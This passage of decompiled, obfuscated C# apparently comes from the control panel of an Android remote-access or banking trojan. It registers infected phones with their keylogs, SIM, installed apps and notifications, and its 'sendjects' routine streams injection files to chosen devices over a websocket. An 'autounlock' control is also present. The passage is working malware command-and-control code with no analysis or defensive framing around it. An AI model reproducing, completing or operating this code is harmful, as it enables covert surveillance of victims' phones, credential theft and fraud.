				Bitmap cli_flag = (Bitmap)IPtoFlag.getflag(ClientAddress).Clone();
				string countryName = IPtoFlag.GetCountryName(ClientAddress);
				string text7 = EXGuarder._7262202D;
				if (text6.Contains(EXGuarder._21364D4A) && !text6.Contains(EXGuarder._57283969))
				{
					string[] array = text6.Split(EXGuarder._21364D4A);
					text7 = EXGuarder._2A6E6419;
					string[] array2 = array;
					foreach (string str in array2)
					{
						string text8 = codes.FromBase64(str);
						if (text8 != null && !codes.StrisEmpty(text8) && text8.Contains(EXGuarder._4300720D))
						{
							string[] array3 = text8.Split(new string[1] { EXGuarder._4300720D }, StringSplitOptions.None);
							string s = array3[1];
							text7 = text7 + s.Split(EXGuarder._27192E1A)[0].ToUpper() + EXGuarder._06786729;
						}
					}
				}
				BTClient bTClient = new BTClient(cli_name, Resources.scr_load, (Bitmap)image, cli_flag, cli_wifi, bitmap, cli_android, ClientAddress, text, text5.Replace(EXGuarder._780B1833, EXGuarder._2A6E6419), cli_installdate, text7, countryName, cli_sim, EXGuarder._053E4508, cli_keylogs, cli_vapps, cli_activz, cli_notifys, cli_vLinks, text2, cli_mobname, cli_tag);
				bTClient.WifiType = text3;
				bTClient.Serverins = srverinf;
				bTClient.IsSecured = flag;
				bTClient.VerifiedSecure = flag;
				bTClient.EncryptState = flag;
				srverinf.TotalClients++;
				clients.Add(bTClient.mobid, bTClient);
				bTClient.httpClient = srverinf.MainhttpClient;
				string text9 = codes.DaysPassed(bTClient.installdate);
				string serverNextKey = ServersMgr.GetServerNextKey(srverinf.Address);
				string serverIDF = ServersMgr.GetServerIDF(srverinf.Address);
				bTClient.Websockclient = srverinf.WSClient;
				bTClient.SecoundIDF = serverIDF;
				bTClient.CreateSocket(bTClient);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._0638503C, BTConst.startpng);
				Dictionary<string, object> chatData = dictionary;
				commands(chatData, bTClient.mobid, srverinf.WSClient);
				MainForm.AddClient(new object[2] { bTClient, text9 });
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Debuger.Log_e(EXGuarder._68655138, codes.EXtoString(ex2));
				ProjectData.ClearProjectError();
			}
		}
	}

	public static BTClient GetClientById(string mobid)
	{
		if (clients.ContainsKey(mobid))
		{
			return clients[mobid];
		}
		return null;
	}

	public static void commands(Dictionary<string, object> chatData, string mobpid, WebSocketClient wbs)
	{
		if (wbs == null)
		{
			Debuger.Log_e(EXGuarder._1458406A, chatData.ToString());
			return;
		}
		bool issecure = GetClientById(mobpid)?.IsSecured ?? false;
		wbs.SendComCommand(chatData, mobpid, issecure);
	}

	public static void sendjects(string neededjects, string mobid, WebSocketClient WSClient)
	{
		string[] array = neededjects.ToString().Split(new string[1] { EXGuarder._1723712C }, StringSplitOptions.RemoveEmptyEntries);
		if (array == null || array.Length == 0)
		{
			return;
		}
		string[] array2 = array;
		checked
		{
			foreach (string text in array2)
			{
				try
				{
					if (string.IsNullOrWhiteSpace(text))
					{
						continue;
					}
					string text2 = Path.Combine(MyRes.injections_Path, text + EXGuarder._1422503E);
					if (!File.Exists(text2))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(text2);
					if (!fileInfo.Exists)
					{
						continue;
					}
					long length = fileInfo.Length;
					if (length <= 0)
					{
						continue;
					}
					int num = codes.CalculateBufferSize(length);
					if (num < 1024)
					{
						num = 1024;
					}
					byte[] array3 = new byte[num - 1 + 1];
					long num2 = 0L;
					int num3 = 0;
					string value = codes.CalculateMD5(text2);
					using (FileStream fileStream = new FileStream(text2, FileMode.Open, FileAccess.Read, FileShare.Read))
					{
						while (true)
						{
							int num4 = fileStream.Read(array3, 0, array3.Length);
							if (num4 <= 0)
							{
								break;
							}
							num2 += num4;
							string value2 = Convert.ToBase64String(array3, 0, num4);
							Dictionary<string, object> dictionary = new Dictionary<string, object>();
							dictionary.Add(EXGuarder._5243010D, value);
							dictionary.Add(EXGuarder._5C6E4B2B, EXGuarder._0C473B5A);
							dictionary.Add(EXGuarder._6A500505, EXGuarder._783C0736);
							dictionary.Add(EXGuarder._010F5922, text);
							dictionary.Add(EXGuarder._513E211D, fileInfo.Name);
							dictionary.Add(EXGuarder._77462112, value2);
							dictionary.Add(EXGuarder._3C5B2079, length);
							dictionary.Add(EXGuarder._2F487432, num2);
							dictionary.Add(EXGuarder._3B4C6E2F, num3);
							dictionary.Add(EXGuarder._1A28080B, EXGuarder._1B71441C);
							Dictionary<string, object> chatData = dictionary;
							commands(chatData, mobid, WSClient);
							num3++;
							chatData = null;
							value2 = null;
							Thread.Sleep(10);
						}
					}
					Thread.Sleep(1);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Debug.WriteLine(EXGuarder._25014142 + text + EXGuarder._5C025C47 + ex2.Message);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static DataGridViewButtonColumn CreateDgvRunButtonColumn()
	{
		DataGridViewButtonColumn dataGridViewButtonColumn = new DataGridViewButtonColumn();
		DataGridViewButtonColumn dataGridViewButtonColumn2 = dataGridViewButtonColumn;
		dataGridViewButtonColumn2.Name = EXGuarder._13330448;
		dataGridViewButtonColumn2.HeaderText = EXGuarder._0C6E2875;
		dataGridViewButtonColumn2.Text = BTConst.autounlockbtnstr;
		dataGridViewButtonColumn2.UseColumnTextForButtonValue = true;
		dataGridViewButtonColumn2.FlatStyle = FlatStyle.Flat;
		dataGridViewButtonColumn2.DefaultCellStyle.BackColor = Color.FromArgb(14, 22, 33);
		dataGridViewButtonColumn2.DefaultCellStyle.ForeColor = Color.FromArgb(145, 163, 182);
		dataGridViewButtonColumn2.DefaultCellStyle.SelectionBackColor = Color.FromArgb(14, 22, 33);
		dataGridViewButtonColumn2.DefaultCellStyle.SelectionForeColor = Color.FromArgb(2, 176, 117);
		dataGridViewButtonColumn2.DefaultCellStyle.Font = new Font(EXGuarder._0A30236D, 9f);
		dataGridViewButtonColumn2.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewButtonColumn2 = null;
		return dataGridViewButtonColumn;
	}
}
